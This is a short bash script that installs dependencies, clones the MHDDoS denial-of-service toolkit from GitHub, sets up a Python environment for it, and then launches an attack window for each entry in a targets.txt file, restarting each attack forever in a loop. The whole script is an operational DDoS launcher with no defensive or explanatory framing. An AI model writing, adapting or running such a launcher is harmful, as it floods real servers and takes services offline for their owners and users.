#!/usr/bin/env bash

# Debug
#set -x

# Config
basedir=$(readlink -f $(dirname "$BASH_SOURCE"))
targets="${basedir}/targets.txt"
apt_req=(python3-virtualenv git xterm docker.io vim htop iotop nload cpulimit nmap telnet)

# Install apt dependencies
apt_req_real=()
for i in ${apt_req[@]}; do
  if ! dpkg-query -l $i > /dev/null; then
    apt_req_real+=("$i")
  fi
done
if [[ ! ${#apt_req_real[@]} == 0 ]]; then
  sudo apt update
  sudo apt install -Vy ${apt_req_real[@]}
fi

# Download MHDDoS sources
if [[ ! -d MHDDoS ]]; then
  git clone https://github.com/MHProDev/MHDDoS.git MHDDoS
fi

# Create virtualenv for MHDDoS
if [[ ! -d MHDDoS/env ]]; then
  virtualenv -p /usr/bin/python3 MHDDoS/env
fi

# TODO: Add deps check
# Install python dependencies for MHDDoS
#if ! MHDDoS/env/bin/pip check --quiet; then
#  MHDDoS/env/bin/pip install -r MHDDoS/requirements.txt
#fi
MHDDoS/env/bin/pip install -r MHDDoS/requirements.txt

# Start deploy by MHDDoS
grep -v '^#' ${targets} | grep -xv '' | while read -r line; do
  #xterm -T "${line}" -fa "Monospace" -fs 11 -e /bin/bash -l -c "while true; do MHDDoS/env/bin/python MHDDoS/start.py ${line}; if [ $? -eq 1 ]; then break; fi; done; echo 'Process exited. Press enter for close window...'; read" &
  xterm -T "${line}" -fa "Monospace" -fs 11 -e /bin/bash -l -c "while true; do MHDDoS/env/bin/python MHDDoS/start.py ${line}; done" &
done
